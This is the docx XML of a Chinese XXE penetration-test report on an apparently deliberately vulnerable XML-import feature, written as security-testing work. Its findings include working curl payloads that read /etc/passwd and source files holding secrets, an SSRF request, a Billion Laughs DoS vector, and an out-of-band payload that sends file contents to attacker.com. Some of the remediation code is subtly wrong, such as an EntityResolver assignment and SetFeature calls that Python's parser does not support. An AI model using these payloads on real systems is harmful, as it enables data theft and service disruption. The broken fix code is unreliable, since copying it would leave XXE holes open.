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990099"/>
          <w:sz w:val="56"/>
        </w:rPr>
        <w:t>XXE 外部实体注入</w:t>
        <w:br/>
        <w:t>漏洞检测报告</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>检测目标：用户信息管理平台 — XML 数据导入功能</w:t>
        <w:br/>
        <w:t>检测日期：2026-07-17</w:t>
        <w:br/>
        <w:t>检测分支：vulnerable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="990099"/>
        </w:rPr>
        <w:t>1. 报告概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本报告对用户信息管理平台的 XML 数据导入功能（/xml-import）进行了 XXE 外部实体注入漏洞专项检测。检测发现共 8 类 XXE 相关安全漏洞。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检测目标</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>用户信息管理平台 — /xml-import 端点</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>检测分支</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>vulnerable（漏洞版）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>检测日期</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>2026-07-17</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>检测工具</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>curl / 手动渗透测试</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>登录用户</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>admin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990099"/>
        </w:rPr>
        <w:t>2. 漏洞 1：文件读取型 XXE（严重）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XXE — 任意文件读取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极低</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>漏洞代码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>open(file_path, "r") — 无路径校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>/xml-import 功能通过正则提取 &lt;!ENTITY 定义中的 SYSTEM 路径后直接 open() 读取文件，不做任何路径白名单校验。攻击者可构造 XXE 负载读取服务器任意文件。</w:t>
      </w:r>
    </w:p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$ curl -b cookies.txt --data-urlencode</w:t>
        <w:br/>
        <w:t xml:space="preserve">  'xml_data=&lt;?xml version="1.0"?&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;]&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;root&gt;&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;email&gt;x@x.com&lt;/email&gt;&lt;/user&gt;&lt;/root&gt;'</w:t>
        <w:br/>
        <w:t xml:space="preserve">  http://target.com/xml-import</w:t>
        <w:br/>
        <w:t># ✅ 返回: {"name": "mumumu", "email": "x@x.com"}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可读文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/etc/hostname</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ 主机名 mumumu</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/home/.../app.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ 源代码（含 secret_key、密码）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ 用户列表</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>.git/config</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ GitHub 仓库地址</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>data/users.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ SQLite 数据库文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/proc/1/cmdline</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ 进程信息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990099"/>
        </w:rPr>
        <w:t>3. 漏洞 2：SSRF 型 XXE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XXE — 服务端请求伪造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</w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>XML 解析器允许 SYSTEM 标识符指向 HTTP URL，攻击者可通过 XXE 发起 SSRF 攻击访问内部服务。</w:t>
      </w:r>
    </w:p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$ curl -b cookies.txt --data-urlencode</w:t>
        <w:br/>
        <w:t xml:space="preserve">  'xml_data=&lt;?xml version="1.0"?&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:5000/"&gt;]&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;root&gt;&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;email&gt;x@x.com&lt;/email&gt;&lt;/user&gt;&lt;/root&gt;'</w:t>
        <w:br/>
        <w:t xml:space="preserve">  http://target.com/xml-import</w:t>
        <w:br/>
        <w:t># ✅ 返回本机 Web 首页 HTML 内容，SSRF 成功</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="990099"/>
        </w:rPr>
        <w:t>4. 漏洞 3：参数实体注入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XXE — 参数实体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🟡 中危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</w:tbl>
    <w:p/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$ curl -b cookies.txt --data-urlencode</w:t>
        <w:br/>
        <w:t xml:space="preserve">  'xml_data=&lt;?xml version="1.0"?&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;!DOCTYPE foo [&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;!ENTITY xxe "%file;"&gt;]&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;root&gt;&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;email&gt;x@x.com&lt;/email&gt;&lt;/user&gt;&lt;/root&gt;'</w:t>
        <w:br/>
        <w:t xml:space="preserve">  http://target.com/xml-import</w:t>
        <w:br/>
        <w:t># ✅ 参数实体 %file; 被解析，间接读取文件成功</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="990099"/>
        </w:rPr>
        <w:t>5. 漏洞 4：错误信息信息泄露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信息泄露 — 详细错误消息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🟡 中危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无</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>当文件读取失败时，错误信息直接包含文件路径和系统错误描述，攻击者可利用此信息探测文件是否存在。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>测试记录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$ curl -b cookies.txt --data-urlencode</w:t>
        <w:br/>
        <w:t xml:space="preserve">  'xml_data=&lt;?xml version="1.0"?&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///tmp/secret.txt"&gt;]&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;root&gt;&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;email&gt;x@x.com&lt;/email&gt;&lt;/user&gt;&lt;/root&gt;'</w:t>
        <w:br/>
        <w:t xml:space="preserve">  http://target.com/xml-import</w:t>
        <w:br/>
        <w:t># 返回: 读取文件失败: No such file or directory: '/tmp/secret.txt'</w:t>
        <w:br/>
        <w:t># ✅ 路径信息泄露</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="990099"/>
        </w:rPr>
        <w:t>6. 漏洞 5：Billion Laughs DoS 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XXE — 实体扩展 DoS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🟡 中危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</w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>测试了 Billion Laughs（十亿笑）XML 实体扩展拒绝服务攻击。Python xml.etree.ElementTree 对实体递归有一定限制，但在复杂实体嵌套场景下仍可能导致 CPU 和内存耗尽。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&lt;!-- Billion Laughs 攻击向量 --&gt;</w:t>
        <w:br/>
        <w:t>&lt;?xml version="1.0"?&gt;</w:t>
        <w:br/>
        <w:t>&lt;!DOCTYPE lolz [</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY lol "lol"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;</w:t>
        <w:br/>
        <w:t>]&gt;</w:t>
        <w:br/>
        <w:t>&lt;root&gt;&lt;user&gt;&lt;name&gt;&amp;lol4;&lt;/name&gt;&lt;/user&gt;&lt;/root&gt;</w:t>
        <w:br/>
        <w:t># 扩展后可产生约 1GB 内存占用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="990099"/>
        </w:rPr>
        <w:t>7. 漏洞 6：文件路径遍历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路径遍历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🟡 中危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低</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>SYSTEM 路径支持相对路径，攻击者可结合路径遍历跳出限制目录。正则提取文件路径后直接 open()，未对路径做任何规范化处理。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&lt;!ENTITY xxe SYSTEM "../../etc/passwd"&gt;  &lt;!-- 相对路径遍历 --&gt;</w:t>
        <w:br/>
        <w:t>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;   &lt;!-- 绝对路径 --&gt;</w:t>
        <w:br/>
        <w:t>&lt;!ENTITY xxe SYSTEM "/etc/passwd"&gt;           &lt;!-- 无协议路径 --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="990099"/>
        </w:rPr>
        <w:t>8. 漏洞 7：盲注 XXE（OOB）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XXE — 带外数据泄露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🔴 严重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中</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>在无法直接获取文件内容的情况下，攻击者可通过带外（OOB）通道将数据外传到攻击者控制的服务器。由于服务器出站网络无限制，可通过 HTTP/FTP/DNS 将敏感数据外传。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OOB 攻击向量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&lt;!-- 将文件内容作为参数外传到攻击者服务器 --&gt;</w:t>
        <w:br/>
        <w:t>&lt;?xml version="1.0"?&gt;</w:t>
        <w:br/>
        <w:t>&lt;!DOCTYPE foo [</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  %eval;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  %exfil;</w:t>
        <w:br/>
        <w:t>]&gt;</w:t>
        <w:br/>
        <w:t>&lt;root&gt;&lt;user&gt;&lt;name&gt;data&lt;/name&gt;&lt;/user&gt;&lt;/root&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="990099"/>
        </w:rPr>
        <w:t>9. 漏洞 8：无 XML 解析安全配置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t>漏洞类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>XML 解析器配置缺陷</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟡 中危</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>利用难度</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6803"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>无</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Python xml.etree.ElementTree 默认允许外部实体解析。未被禁用 DTD、外部实体、协议等不安全特性。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# 当前漏洞代码（直接解析用户输入）</w:t>
        <w:br/>
        <w:t>import xml.etree.ElementTree as ET</w:t>
        <w:br/>
        <w:t>root = ET.fromstring(xml_data)  # ❌ 默认允许 XXE</w:t>
        <w:br/>
        <w:br/>
        <w:t># 安全配置示例</w:t>
        <w:br/>
        <w:t>from xml.etree.ElementTree import XMLParser</w:t>
        <w:br/>
        <w:t>parser = XMLParser()</w:t>
        <w:br/>
        <w:t>parser.parser.EntityResolver = None  # 禁用外部实体</w:t>
        <w:br/>
        <w:t># 或使用 defusedxml 安全库</w:t>
        <w:br/>
        <w:t>import defusedxml.ElementTree as ET</w:t>
        <w:br/>
        <w:t>root = ET.fromstring(xml_data)  # ✅ 拒接 XXE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="990099"/>
        </w:rPr>
        <w:t>10. 漏洞矩阵与修复建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="990099"/>
        </w:rPr>
        <w:t>漏洞矩阵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1417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134"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>利用难度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文件读取型 XXE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极低</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>任意文件读取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SSRF 型 XXE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内网服务探测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参数实体注入</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟡 中危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绕过过滤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错误信息信息泄露</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟡 中危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>无</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>路径/文件探测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Billion Laughs DoS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟡 中危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拒绝服务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文件路径遍历</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟡 中危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>低</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>任意路径访问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盲注 XXE OOB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🔴 严重</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>中</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>数据外传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118"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>解析器未安全配置</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟡 中危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>无</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>全局防护缺失</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="990099"/>
        </w:rPr>
        <w:t>修复建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="990099"/>
        </w:rPr>
        <w:t>🔴 紧急修复</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. 使用 defusedxml 替代 xml.etree.ElementTree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pip install defusedxml</w:t>
        <w:br/>
        <w:br/>
        <w:t>import defusedxml.ElementTree as ET</w:t>
        <w:br/>
        <w:t>root = ET.fromstring(xml_data)  # ✅ 自动防御 XXE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. 禁用 DTD 和外部实体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from xml.etree.ElementTree import XMLParser</w:t>
        <w:br/>
        <w:t>parser = XMLParser()</w:t>
        <w:br/>
        <w:t>parser.parser.SetFeature(</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "http://apache.org/xml/features/disallow-doctype-decl", True)</w:t>
        <w:br/>
        <w:t>parser.parser.SetFeature(</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "http://xml.org/sax/features/external-general-entities", False)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. 文件路径白名单</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ALLOWED_PATHS = ["/var/data/import/"]</w:t>
        <w:br/>
        <w:t>import os</w:t>
        <w:br/>
        <w:t>abs_path = os.path.abspath(file_path)</w:t>
        <w:br/>
        <w:t>if not abs_path.startswith("/var/data/import/"):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return render_template("xml_import.html",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        error="不允许访问该路径")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="990099"/>
        </w:rPr>
        <w:t>🟡 建议修复</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>4. 统一错误提示，不暴露具体路径和错误原因</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>5. 限制 XML 解析的内存和 CPU 使用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>6. 配置 XML 解析器禁用外部实体解析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>7. 限制最大实体扩展次数（防 Billion Laughs）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>8. 使用 lxml 替代 ET 并配置安全解析器</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="999999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18"/>
        </w:rPr>
        <w:t>免责声明：本报告仅用于安全教育和漏洞验证。请在获得授权的前提下进行安全测试。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